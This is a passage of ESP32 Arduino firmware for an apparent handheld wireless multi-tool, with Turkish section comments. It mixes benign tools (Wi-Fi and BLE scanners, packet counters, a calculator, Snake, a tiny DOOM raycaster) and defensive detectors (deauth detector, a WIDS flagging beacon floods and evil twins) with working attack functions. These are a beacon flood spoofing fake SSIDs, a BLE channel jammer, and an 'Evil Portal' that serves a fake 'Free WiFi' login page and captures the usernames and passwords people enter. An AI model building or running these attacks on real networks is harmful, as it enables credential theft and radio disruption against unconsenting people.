  WiFi.mode(WIFI_AP_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous(false); esp_wifi_set_promiscuous(true);
  const char* fakes[] = {"FreeWiFi","Starbucks","McDonalds","AirportWiFi","HotelGuest","PublicWiFi","AndroidAP","iPhone","HomeWiFi","OfficeWiFi","Linksys","NETGEAR","TP-Link","ATTWiFi","VerizonWiFi"};
  const int num = 15;
  uint8_t pkt[128];
  int chan = 1;
  displayInfo("Beacon Flood", "SEL to stop");
  while (!selPressed()) {
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    chan = (chan % 13) + 1;
    for (int i = 0; i < num; i++) {
      uint8_t spoofed[6];
      for (int j = 0; j < 6; j++) spoofed[j] = random(256);
      esp_wifi_set_mac(WIFI_IF_AP, spoofed);
      memset(pkt, 0, 128);
      pkt[0] = 0x80; pkt[1] = 0x00;
      memcpy(pkt + 4, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
      memcpy(pkt + 10, spoofed, 6);
      memcpy(pkt + 16, spoofed, 6);
      pkt[22] = random(256); pkt[23] = random(256);
      int pos = 24;
      memset(pkt + pos, 0, 8); pos += 8;
      pkt[pos++] = 0x64; pkt[pos++] = 0x00;
      pkt[pos++] = 0x21; pkt[pos++] = 0x04;
      pkt[pos++] = 0x00; pkt[pos++] = strlen(fakes[i]);
      memcpy(pkt + pos, fakes[i], strlen(fakes[i])); pos += strlen(fakes[i]);
      pkt[pos++] = 0x01; pkt[pos++] = 0x08;
      pkt[pos++] = 0x82; pkt[pos++] = 0x84; pkt[pos++] = 0x8b; pkt[pos++] = 0x96;
      pkt[pos++] = 0x0c; pkt[pos++] = 0x12; pkt[pos++] = 0x18; pkt[pos++] = 0x24;
      esp_wifi_80211_tx(WIFI_IF_AP, pkt, pos, false);
      delay(1);
      yield();
    }
  }
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

// ==========================================
// DEAUTH DEDEKTÖR
// ==========================================
volatile uint32_t deauthDetectCount = 0;
void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  if (pkt->payload[0] == 0xC0) deauthDetectCount++;
}

void runDeauthDetect() {
  stopRadios();
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);
  deauthDetectCount = 0;
  unsigned long lastCheck = millis();
  displayInfo("Deauth Detect", "SEL to stop");
  while (!selPressed()) {
    if (millis() - lastCheck > 1000) {
      display.clearDisplay();
      display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
      display.setCursor(0, 0); display.println("Deauth Detector");
      display.setCursor(0, 12); display.print("Count: "); display.print(deauthDetectCount);
      display.setCursor(0, 24); display.print("Status: ");
      if (deauthDetectCount > 20) display.print("ATTACK!");
      else if (deauthDetectCount > 0) display.print("Suspicious");
      else display.print("Normal");
      display.display();
      deauthDetectCount = 0;
      lastCheck = millis();
    }
    yield();
  }
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

// ==========================================
// BLE SCANNER
// ==========================================
static BLEAdvertisedDevice* scannedDevices[10] = {nullptr};
static String bleNames[10], bleMacs[10];
static int bleRSSI[10], scanCount = 0;

class MyAdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice dev) {
    if (scanCount >= 10) return;
    scannedDevices[scanCount] = new BLEAdvertisedDevice(dev);
    bleNames[scanCount] = dev.haveName() ? dev.getName().c_str() : "Unknown";
    bleMacs[scanCount] = dev.getAddress().toString().c_str();
    bleRSSI[scanCount] = dev.getRSSI();
    scanCount++;
  }
};

void runBLEScanner() {
  stopRadios();
  WiFi.mode(WIFI_OFF);
  BLEDevice::init("");
  BLEScan* pScan = BLEDevice::getScan();
  pScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pScan->setActiveScan(true); pScan->setInterval(100); pScan->setWindow(99);
  scanCount = 0;
  displayInfo("BLE Scanner", "Scanning...");
  pScan->start(5, false);
  int sel = 0;
  while (!selPressed()) {
    display.clearDisplay(); display.setTextSize(1); display.setTextColor(1);
    if (scanCount == 0) { display.setCursor(0, 0); display.println("No devices"); }
    else {
      int idx = sel % scanCount;
      display.setCursor(0, 0); display.print(idx + 1); display.print("/"); display.print(scanCount);
      display.setCursor(0, 12); display.println(bleNames[idx]);
      display.setCursor(0, 24); display.print(bleRSSI[idx]); display.println(" dBm");
    }
    display.display();
    if (upPressed()) sel = (sel == 0) ? scanCount - 1 : sel - 1;
    if (downPressed()) sel = (sel + 1) % scanCount;
    yield();
  }
  for (int i = 0; i < scanCount; i++) delete scannedDevices[i];
  BLEDevice::deinit(true);
  initRadios();
}

// ==========================================
// BLE TARGET JAM
// ==========================================
void runBLETargetJam() {
  initRadios();
  displayInfo("BLE Targ.Jam", "SEL to stop");
  while (!selPressed()) {
    if (radio1Active) radio.setChannel(2); if (radio2Active) radio2.setChannel(2); delayMicroseconds(150);
    if (radio1Active) radio.setChannel(26); if (radio2Active) radio2.setChannel(26); delayMicroseconds(150);
    if (radio1Active) radio.setChannel(80); if (radio2Active) radio2.setChannel(80); delayMicroseconds(150);
    yield();
  }
}

// ==========================================
// WiFi ANALYZER (128x64)
// ==========================================
void runWiFiAnalyzer() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  safeDelay(100);
  int n = WiFi.scanNetworks();
  if (n == 0) { displayInfo("No networks"); safeDelay(2000); recoverFromWiFi(); return; }
  int bestRSSI[14] = {0};
  String bestSSID[14];
  for (int i = 0; i < n; i++) {
    int ch = WiFi.channel(i);
    if (ch >= 1 && ch <= 13) {
      if (WiFi.RSSI(i) > bestRSSI[ch]) {
        bestRSSI[ch] = WiFi.RSSI(i);
        bestSSID[ch] = WiFi.SSID(i);
      }
    }
  }
  display.clearDisplay();
  for (int ch = 1; ch <= 13; ch++) {
    int barH = map(bestRSSI[ch], -100, -30, 0, 50);
    int x = map(ch, 1, 13, 2, 125);
    display.drawLine(x, 60, x, 60 - barH, SSD1306_WHITE);
  }
  display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0); display.print("WiFi 1-13");
  display.display();
  safeDelay(3000);
  int sel = 0;
  while (!selPressed()) {
    display.clearDisplay();
    display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
    int ch = sel + 1;
    display.setCursor(0, 0); display.print("Ch:"); display.print(ch);
    display.setCursor(0, 12);
    if (bestRSSI[ch] != 0) {
      display.print(bestSSID[ch]);
      display.setCursor(0, 24);
      display.print(bestRSSI[ch]); display.print(" dBm");
    } else {
      display.print("empty");
    }
    display.display();
    if (upPressed()) sel = (sel == 0) ? 12 : sel - 1;
    if (downPressed()) sel = (sel + 1) % 13;
    yield();
  }
  WiFi.scanDelete();
  recoverFromWiFi();
}

// ==========================================
// EVIL PORTAL
// ==========================================
const char loginPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><title>Free WiFi</title></head>
<body style='text-align:center;font-family:Arial;'>
<h1>Free WiFi Login</h1>
<form action='/login' method='POST'>
<input name='user' placeholder='Username'><br>
<input name='pass' type='password' placeholder='Password'><br>
<input type='submit' value='Connect'>
</form></body></html>)rawliteral";

void runEvilPortal() {
  stopRadios();
  WiFi.mode(WIFI_AP);
  WiFi.softAP("Free WiFi");
  dnsServer.start(53, "*", WiFi.softAPIP());
  webServer.begin();
  capturedCredentials = "";
  displayInfo("Evil Portal", "AP: Free WiFi", "Waiting...");
  while (!selPressed()) {
    dnsServer.processNextRequest();
    WiFiClient client = webServer.available();
    if (client) {
      String request = client.readStringUntil('\r');
      client.flush();
      if (request.indexOf("POST /login") != -1) {
        String body = client.readString();
        int uIdx = body.indexOf("user=");
        int pIdx = body.indexOf("pass=");
        if (uIdx != -1 && pIdx != -1) {
          String user = body.substring(uIdx + 5, body.indexOf('&', uIdx));
          String pass = body.substring(pIdx + 5);
          pass.replace("+", " ");
          capturedCredentials = "U:" + user + " P:" + pass;
        }
        client.println("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n<h1>Connected!</h1>");
      } else {
        client.print("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n");
        client.print(FPSTR(loginPage));
      }
      client.stop();
      if (capturedCredentials != "") {
        displayInfo("Captured!", capturedCredentials, "SEL to exit");
      }
    }
    yield();
  }
  dnsServer.stop();
  webServer.stop();
  WiFi.softAPdisconnect(true);
  recoverFromWiFi();
}

// ==========================================
// DOOM (128x64 uyumlu)
// ==========================================
static const uint8_t PROGMEM doomMap[16][16] = {
  {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1},
  {1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},
  {1,0,1,1,0,1,1,0,0,1,1,0,1,1,0,1},
  {1,0,1,0,0,0,1,0,0,1,0,0,0,1,0,1},
  {1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},
  {1,0,1,0,0,1,1,0,0,1,1,0,0,1,0,1},
  {1,0,1,0,0,0,0,0,0,0,0,0,0,1,0,1},
  {1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},
  {1,0,1,0,0,1,0,0,0,0,1,0,0,1,0,1},
  {1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1},
  {1,0,1,1,0,1,0,0,0,0,1,0,1,1,0,1},
  {1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},
  {1,0,0,1,0,0,1,0,0,1,0,0,1,0,0,1},
  {1,0,0,1,0,0,0,0,0,0,0,0,1,0,0,1},
  {1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},
  {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1}
};

float posX = 8.0, posY = 8.0, dirX = -1.0, dirY = 0.0, planeX = 0.0, planeY = 0.66;
unsigned long selHoldStart = 0;

void shootRay() {
  display.fillScreen(SSD1306_WHITE);
  display.display();
  delay(50);
  display.fillScreen(SSD1306_BLACK);
  display.display();
}

void runDOOM() {
  posX = 8.0; posY = 8.0; dirX = -1.0; dirY = 0.0; planeX = 0.0; planeY = 0.66;
  displayInfo("DOOM", "UP/DN:aim", "SEL:fire hold 5s exit");
  safeDelay(1500);
  while (true) {
    if (digitalRead(SELECT_BUTTON_PIN) == LOW) {
      if (selHoldStart == 0) selHoldStart = millis();
      if (millis() - selHoldStart > 5000) break;
    } else {
      selHoldStart = 0;
    }
    if (selPressed()) shootRay();
    if (upPressed()) {
      float oldDirX = dirX;
      dirX = dirX * cos(0.1) - dirY * sin(0.1);
      dirY = oldDirX * sin(0.1) + dirY * cos(0.1);
      float oldPlaneX = planeX;
      planeX = planeX * cos(0.1) - planeY * sin(0.1);
      planeY = oldPlaneX * sin(0.1) + planeY * cos(0.1);
    }
    if (downPressed()) {
      float oldDirX = dirX;
      dirX = dirX * cos(-0.1) - dirY * sin(-0.1);
      dirY = oldDirX * sin(-0.1) + dirY * cos(-0.1);
      float oldPlaneX = planeX;
      planeX = planeX * cos(-0.1) - planeY * sin(-0.1);
      planeY = oldPlaneX * sin(-0.1) + planeY * cos(-0.1);
    }
    display.clearDisplay();
    for (int x = 0; x < 128; x++) {
      float cameraX = 2.0 * x / 128.0 - 1.0;
      float rayDirX = dirX + planeX * cameraX;
      float rayDirY = dirY + planeY * cameraX;
      int mapX = (int)posX, mapY = (int)posY;
      float sideDistX, sideDistY;
      float deltaDistX = fabs(1.0 / rayDirX);
      float deltaDistY = fabs(1.0 / rayDirY);
      float perpWallDist;
      int stepX, stepY, hit = 0, side;
      if (rayDirX < 0) { stepX = -1; sideDistX = (posX - mapX) * deltaDistX; }
      else { stepX = 1; sideDistX = (mapX + 1.0 - posX) * deltaDistX; }
      if (rayDirY < 0) { stepY = -1; sideDistY = (posY - mapY) * deltaDistY; }
      else { stepY = 1; sideDistY = (mapY + 1.0 - posY) * deltaDistY; }
      while (hit == 0) {
        if (sideDistX < sideDistY) { sideDistX += deltaDistX; mapX += stepX; side = 0; }
        else { sideDistY += deltaDistY; mapY += stepY; side = 1; }
        if (pgm_read_byte(&doomMap[mapX][mapY]) > 0) hit = 1;
      }
      if (side == 0) perpWallDist = (mapX - posX + (1 - stepX) / 2) / rayDirX;
      else perpWallDist = (mapY - posY + (1 - stepY) / 2) / rayDirY;
      int lineHeight = (int)(64 / perpWallDist);
      int drawStart = -lineHeight / 2 + 32;
      if (drawStart < 0) drawStart = 0;
      int drawEnd = lineHeight / 2 + 32;
      if (drawEnd >= 64) drawEnd = 63;
      if (perpWallDist > 5) {
        for (int y = drawStart; y <= drawEnd; y += 2) display.drawPixel(x, y, SSD1306_WHITE);
      } else {
        display.drawFastVLine(x, drawStart, drawEnd - drawStart + 1, SSD1306_WHITE);
      }
    }
    display.display();
    yield();
  }
  currentState = STATE_MENU;
  drawMenu();
}

// ==========================================
// HESAP MAKİNESİ
// ==========================================
void runCalculator() {
  int num1 = 0, num2 = 0;
  char op = '+';
  int cursor = 0;
  while (!selPressed()) {
    display.clearDisplay();
    display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, 0);
    display.print(cursor == 0 ? ">" : " "); display.print(num1);
    display.print(' ');
    display.print(cursor == 1 ? ">" : " "); display.print(op);
    display.print(' ');
    display.print(cursor == 2 ? ">" : " "); display.print(num2);
    if (cursor == 3) {
      display.print(" = ");
      switch (op) {
        case '+': display.print(num1 + num2); break;
        case '-': display.print(num1 - num2); break;
        case '*': display.print(num1 * num2); break;
        case '/': display.print(num2 ? num1 / num2 : 0); break;
      }
    }
    display.setCursor(0, 50); display.print("UP/DN:chg SEL:next");
    display.display();
    if (upPressed()) {
      if (cursor == 0) num1++; else if (cursor == 2) num2++;
      else if (cursor == 1) op = (op == '+' ? '-' : op == '-' ? '*' : op == '*' ? '/' : '+');
    }
    if (downPressed()) {
      if (cursor == 0) num1--; else if (cursor == 2) num2--;
      else if (cursor == 1) op = (op == '+' ? '/' : op == '/' ? '*' : op == '*' ? '-' : '+');
    }
    if (selPressed()) { cursor = (cursor + 1) % 4; if (cursor == 3) safeDelay(200); }
    yield();
  }
  currentState = STATE_MENU; drawMenu();
}

// ==========================================
// DİRENÇ RENK KODU HESAPLAYICI
// ==========================================
const char resistorColors[10][8] = {"Black","Brown","Red","Orange","Yellow","Green","Blue","Violet","Gray","White"};
const long multiplierTable[10] = {1,10,100,1000,10000,100000,1000000,10000000,100000000,1000000000};

void runResistorCalc() {
  int bands = 4;
  int band[4] = {0,0,0,1};
  int numDigits = 2;
  int selBand = 0;
  bool choose = true;
  while (choose) {
    display.clearDisplay(); display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
    display.setCursor(0,0); display.print("Bands:"); display.print(bands);
    display.setCursor(0,12); display.print("UP/DN change SEL ok");
    display.display();
    if (upPressed()||downPressed()) { bands = (bands==4?5:4); safeDelay(200); }
    if (selPressed()) { choose=false; numDigits = (bands==4?2:3); safeDelay(200); }
    yield();
  }
  while (!selPressed()) {
    long val;
    if (bands==4) val = (band[0]*10 + band[1]) * multiplierTable[band[2]];
    else val = (band[0]*100 + band[1]*10 + band[2]) * multiplierTable[band[3]];
    String tolStr = (band[bands-1]==1?"1%":(band[bands-1]==2?"2%":"0.5%"));
    display.clearDisplay(); display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
    display.setCursor(0,0); display.print(val); display.print(" Ohm ");
    display.print(tolStr);
    int idx = selBand;
    if (idx < numDigits) {
      display.setCursor(0,12); display.print("Digit "); display.print(idx+1); display.print(": ");
      display.print(resistorColors[band[idx]]);
    } else if (idx == numDigits) {
      display.setCursor(0,12); display.print("Multiplier: ");
      display.print(resistorColors[band[numDigits]]);
    } else {
      display.setCursor(0,12); display.print("Tolerance: ");
      display.print(resistorColors[band[bands-1]]);
    }
    display.display();
    if (upPressed()) { band[idx] = (band[idx] + 1) % 10; safeDelay(100); }
    if (downPressed()) { band[idx] = (band[idx] + 9) % 10; safeDelay(100); }
    if (selPressed()) { selBand = (selBand + 1) % (bands); safeDelay(150); }
    yield();
  }
  currentState = STATE_MENU; drawMenu();
}

// ==========================================
// WiFi MONITOR (genişletildi)
// ==========================================
void runWiFiMonitor() {
  stopRadios();
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  displayInfo("WiFi Monitor", "SEL to exit");
  while (!selPressed()) {
    int n = WiFi.scanNetworks();
    display.clearDisplay();
    display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
    display.setCursor(0,0); display.print("APs:"); display.print(min(n,8));
    for (int i=0; i<min(n,8); i++) {
      int rssi = WiFi.RSSI(i);
      int bar = map(rssi, -100, -30, 0, 110);
      display.fillRect(0, 14 + i*6, bar, 4, SSD1306_WHITE);
      String ssid = WiFi.SSID(i);
      if (ssid.length()>12) ssid = ssid.substring(0,12);
      display.setCursor(0, 14 + i*6); display.print(ssid);
    }
    display.display();
    WiFi.scanDelete();
    safeDelay(2000);
    yield();
  }
  recoverFromWiFi();
}

// ==========================================
// SNAKE (128x64 uyumlu)
// ==========================================
void runSnakeGame() {
  const int gw=32, gh=16;
  int sx[100], sy[100];
  int len=3, dx=1, dy=0, fx, fy;
  bool go=false;
  randomSeed(millis());
  for(int i=0;i<len;i++){ sx[i]=gw/2-i; sy[i]=gh/2; }
  auto pf = [&](){ do{ fx=random(gw); fy=random(gh); go=false; for(int i=0;i<len;i++) if(sx[i]==fx&&sy[i]==fy) go=true; }while(go); };
  pf();
  unsigned long lm=millis();
  displayInfo("Snake","UP/DN turn","SEL exit");
  safeDelay(800);
  while(!selPressed()){
    if(upPressed()){ int t=dx; dx=-dy; dy=t; }
    if(downPressed()){ int t=dx; dx=dy; dy=-t; }
    if(millis()-lm>200){
      int nx=sx[0]+dx, ny=sy[0]+dy;
      if(nx<0||nx>=gw||ny<0||ny>=gh) break;
      for(int i=0;i<len;i++) if(sx[i]==nx&&sy[i]==ny) break;
      for(int i=len;i>0;i--){ sx[i]=sx[i-1]; sy[i]=sy[i-1]; }
      sx[0]=nx; sy[0]=ny;
      if(nx==fx&&ny==fy){ len++; pf(); }
      lm=millis();
    }
    display.clearDisplay();
    for(int i=0;i<len;i++) display.fillRect(sx[i]*4,sy[i]*4,4,4,SSD1306_WHITE);
    display.fillRect(fx*4,fy*4,4,4,SSD1306_WHITE);
    display.display();
    yield();
  }
  displayInfo("Game Over","Score:"+String(len-3),"SEL");
  while(!selPressed()) yield();
  currentState = STATE_MENU; drawMenu();
}

// ==========================================
// PACKET COUNTER
// ==========================================
volatile uint32_t pktCount = 0;
int pktChannel = 1;
void pktCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  pktCount++;
}
void runPacketCounter() {
  stopRadios();
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&pktCb);
  esp_wifi_set_channel(pktChannel, WIFI_SECOND_CHAN_NONE);
  pktCount = 0;
  displayInfo("Packet Count", "Ch:"+String(pktChannel), "UP/DN chg SEL exit");
  while (!selPressed()) {
    if (upPressed()) { pktChannel = (pktChannel % 13) + 1; esp_wifi_set_channel(pktChannel, WIFI_SECOND_CHAN_NONE); pktCount=0; }
    if (downPressed()) { pktChannel = (pktChannel == 1) ? 13 : pktChannel - 1; esp_wifi_set_channel(pktChannel, WIFI_SECOND_CHAN_NONE); pktCount=0; }
    display.clearDisplay();
    display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
    display.setCursor(0,0); display.print("Ch:"); display.print(pktChannel);
    display.setCursor(0,20); display.print("Pkt:"); display.print(pktCount);
    display.display();
    safeDelay(500);
    yield();
  }
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

// ==========================================
// WiFi PACKET SNIFFER (Management/Control/Data)
// ==========================================
volatile uint32_t mgmtCount=0, ctrlCount=0, dataCount=0;
void snifferCb(void* buf, wifi_promiscuous_pkt_type_t pkt_type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t frameType = pkt->payload[0];
  uint8_t typeVal = frameType & 0x0C;
  if (typeVal == 0x00) mgmtCount++;
  else if (typeVal == 0x04) ctrlCount++;
  else if (typeVal == 0x08) dataCount++;
}

void runWiFiSniffer() {
  stopRadios();
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&snifferCb);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  mgmtCount=ctrlCount=dataCount=0;
  int chan=1;
  displayInfo("WiFi Sniffer", "Ch:"+String(chan), "UP/DN chg SEL exit");
  while (!selPressed()) {
    if (upPressed()) { chan = (chan % 13) + 1; esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE); mgmtCount=ctrlCount=dataCount=0; }
    if (downPressed()) { chan = (chan == 1) ? 13 : chan - 1; esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE); mgmtCount=ctrlCount=dataCount=0; }
    display.clearDisplay();
    display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
    display.setCursor(0,0); display.print("Ch:"); display.print(chan);
    display.setCursor(0,15); display.print("M:"); display.print(mgmtCount);
    display.setCursor(0,30); display.print("C:"); display.print(ctrlCount);
    display.setCursor(0,45); display.print("D:"); display.print(dataCount);
    display.display();
    safeDelay(1000);
    yield();
  }
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

// ==========================================
// WIDS
// ==========================================
#define MAX_APS 30
struct APInfo {
  uint8_t bssid[6];
  String ssid;
  int rssi;
  uint32_t lastSeen;
  bool isEvilTwin;
};
APInfo knownAPs[MAX_APS];
int knownAPCount = 0;
volatile uint32_t beaconCount = 0;
volatile uint32_t deauthCount = 0;
volatile bool floodAlert = false;
volatile bool evilTwinAlert = false;
String evilTwinSSID = "";

void wids_promiscuous_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *frame = pkt->payload;
  uint8_t type_subtype = frame[0];
  uint8_t subtype = type_subtype & 0xFC;
  if (subtype == 0x80) {
    beaconCount++;
    uint8_t *bssid = frame + 10;
    int8_t rssi = pkt->rx_ctrl.rssi;
    String ssid = "";
    int pos = 36;
    while (pos < pkt->rx_ctrl.sig_len - 2) {
      uint8_t id = frame[pos];
      uint8_t len = frame[pos+1];
      if (id == 0 && len > 0) {
        char temp[len+1];
        memcpy(temp, &frame[pos+2], len);
        temp[len] = 0;
        ssid = String(temp);
        break;
      }
      pos += len + 2;
    }
    bool found = false;
    for (int i=0; i<knownAPCount; i++) {
      if (memcmp(knownAPs[i].bssid, bssid, 6) == 0) {
        knownAPs[i].rssi = rssi;
        knownAPs[i].lastSeen = millis();
        found = true;
        break;
      }
    }
    if (!found && knownAPCount < MAX_APS) {
      memcpy(knownAPs[knownAPCount].bssid, bssid, 6);
      knownAPs[knownAPCount].ssid = ssid;
      knownAPs[knownAPCount].rssi = rssi;
      knownAPs[knownAPCount].lastSeen = millis();
      knownAPs[knownAPCount].isEvilTwin = false;
      knownAPCount++;
    }
    for (int i=0; i<knownAPCount; i++) {
      for (int j=i+1; j<knownAPCount; j++) {
        if (knownAPs[i].ssid == knownAPs[j].ssid && knownAPs[i].ssid != "") {
          if (memcmp(knownAPs[i].bssid, knownAPs[j].bssid, 6) != 0) {
            if (abs(knownAPs[j].rssi - knownAPs[i].rssi) > 20) {
              evilTwinAlert = true;
              evilTwinSSID = knownAPs[i].ssid;
            }
          }
        }
      }
    }
  }
  else if (subtype == 0xC0) {
    deauthCount++;
  }
}

void runWIDS() {
  stopRadios();
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wids_promiscuous_cb);
  beaconCount = 0;
  deauthCount = 0;
  floodAlert = false;
  evilTwinAlert = false;
  knownAPCount = 0;
  unsigned long lastCheck = millis();
  const int BEACON_THRESHOLD = 50;
  const int DEAUTH_THRESHOLD = 15;
  displayInfo("WIDS Active", "SEL to exit");
  while (!selPressed()) {
    if (millis() - lastCheck >= 1000) {
      if (beaconCount > BEACON_THRESHOLD) floodAlert = true;
      else floodAlert = false;
      display.clearDisplay();
      display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
      display.setCursor(0,0); display.print("WIDS Monitor");
      display.setCursor(0,15); display.print("B:"); display.print(beaconCount);
      display.print(" D:"); display.print(deauthCount);
      if (floodAlert || evilTwinAlert || deauthCount > DEAUTH_THRESHOLD) {
        display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
        display.setCursor(0,35);
        if (floodAlert) display.print("FLOOD!");
        else if (evilTwinAlert) { display.print("EVIL TWIN: "); display.print(evilTwinSSID); }
        else if (deauthCount > DEAUTH_THRESHOLD) display.print("DEAUTH ATTACK");
      } else {
        display.setCursor(0,35); display.print("Normal");
      }
      display.display();
      beaconCount = 0;
      deauthCount = 0;
      evilTwinAlert = false;
      lastCheck = millis();
    }
    yield();
  }
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  recoverFromWiFi();
}

// ==========================================
// RF ANALYZER (çift radyo, 128x64)
// ==========================================
void runRFAnalyzer() {
  initRadios();
  radio2.stopConstCarrier();
  radio2.setAutoAck(false);
  radio2.startListening();
  radio2.setChannel(45);
  const int w = 128, h = 48;
  uint8_t waterfall[128 * (h/8 + 1)] = {0};
  bool exitFlag = false;
  displayInfo("RF Analyzer", "Dual Radio", "SEL to exit");
  while (!exitFlag) {
    if (selPressed()) exitFlag = true;
    for (int y = 0; y < h-1; y++) {
      for (int x = 0; x < w; x++) {
        bool bit = (waterfall[(y+1)*(w/8) + x/8] >> (x%8)) & 1;
        if (bit) waterfall[y*(w/8) + x/8] |= (1 << (x%8));
        else     waterfall[y*(w/8) + x/8] &= ~(1 << (x%8));
      }
    }
    for (int x=0; x<w; x++) waterfall[(h-1)*(w/8) + x/8] &= ~(1 << (x%8));
    for (int ch=0; ch<80; ch++) {
      radio.setChannel(ch);
      delayMicroseconds(120);
      if (radio.testRPD()) {
        int x = map(ch, 0, 79, 0, w-1);
        waterfall[(h-1)*(w/8) + x/8] |= (1 << (x%8));
      }
      yield();
    }
    float noiseSum = 0;
    for (int i=0; i<50; i++) {
      if (radio2.testRPD()) noiseSum += 1;
      delayMicroseconds(50);
    }
    float noiseFloor = noiseSum / 50.0;
    display.clearDisplay();
    display.drawBitmap(0, 0, waterfall, w, h, SSD1306_WHITE);
    display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
    display.setCursor(0, h+2); display.print("2.40 N:"); display.print(noiseFloor,1);
    display.setCursor(100, h+2); display.print("2.48");
    display.display();
    safeDelay(20);
  }
  stopRadios();
  initRadios();
}

// ==========================================
// BLE GATT EXPLORER
// ==========================================
static BLEAdvertisedDevice* gattDevice = nullptr;
static BLEClient* pClient = nullptr;

void runBLEGATTExplorer() {
  stopRadios();
  WiFi.mode(WIFI_OFF);
  BLEDevice::init("");
  BLEScan* pScan = BLEDevice::getScan();
  pScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pScan->setActiveScan(true);
  gattDevice = nullptr;
  displayInfo("BLE GATT", "Scanning...");
  pScan->start(5, false);
  while (gattDevice == nullptr && !selPressed()) {
    if (scanCount > 0) gattDevice = scannedDevices[0];
    yield();
  }
  pScan->stop();
  if (gattDevice != nullptr) {
    displayInfo("Connecting", gattDevice->getName().c_str());
    pClient = BLEDevice::createClient();
    if (pClient->connect(gattDevice)) {
      displayInfo("Connected", "Getting services...");
      std::map<std::string, BLERemoteService*>* services = pClient->getServices();
      int idx = 0;
      while (!selPressed()) {
        display.clearDisplay();
        display.setTextSize(1); display.setTextColor(SSD1306_WHITE);
        display.setCursor(0,0); display.print("Services:");
        int y = 12;
        int count = 0;
        for (auto& svc : *services) {
          if (count == idx) {
            display.fillRect(0, y-1, 128, 10, SSD1306_WHITE);
            display.setTextColor(SSD1306_BLACK);
          } else display.setTextColor(SSD1306_WHITE);
          display.setCursor(2, y); display.print(String(svc.first.c_str()));
          y += 10;
          if (++count > 4) break;
        }
        display.display();
        if (upPressed()) idx = max(0, idx-1);
        if (downPressed()) idx = min((int)services->size()-1, idx+1);
        yield();
      }
      pClient->disconnect();
    } else {
      displayInfo("Connect failed", "SEL to return");
      while (!selPressed()) yield();
    }
  } else {
    displayInfo("No BLE device", "SEL to return");
    while (!selPressed()) yield();
  }
  BLEDevice::deinit(true);
  initRadios();
}

// ==========================================
// BLE TRACKER
// ==========================================
struct DeviceFingerprint {
  String name;
  int companyId;
  uint8_t payload[30];
  int payloadLen;
  unsigned long lastSeen;
  String lastMac;
};
std::vector<DeviceFingerprint> fingerprints;

void analyzeAdvertisement(BLEAdvertisedDevice dev) {
  String name = dev.haveName() ? dev.getName() : "";
  int manufacturerId = -1;
  String mdataStr = dev.haveManufacturerData() ? dev.getManufacturerData() : "";
  std::string mdata = std::string(mdataStr.c_str());
  if (mdata.length() >= 2) manufacturerId = mdata[0] | (mdata[1] << 8);
  for (auto& fp : fingerprints) {
    if (fp.companyId == manufacturerId && fp.name == name) {
      fp.lastSeen = millis();
      fp.lastMac = dev.getAddress().toString().c_str();
      return;
    }
  }
  DeviceFingerprint newFp;
